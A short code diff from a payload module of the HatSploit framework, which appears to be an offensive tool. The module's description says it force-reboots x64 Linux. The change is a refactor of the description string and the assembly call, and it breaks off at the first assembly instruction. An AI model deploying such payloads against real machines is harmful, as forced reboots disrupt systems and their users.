@@ -15,17 +15,17 @@ class HatSploitPayload(Payload, Linux):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload is intended to force reboot Linux "
-                "with x64 architecture."
-            ),
+            'Description': """
+                This payload is intended to force reboot Linux
+                with x64 architecture.
+            """,
             'Arch': ARCH_X64,
             'Platform': OS_LINUX,
             'Type': ONE_SIDE,
         })
 
     def run(self):
-        return self.assemble(
+        return self.__asm__(
             """
             start:
                 mov al, 0xa2
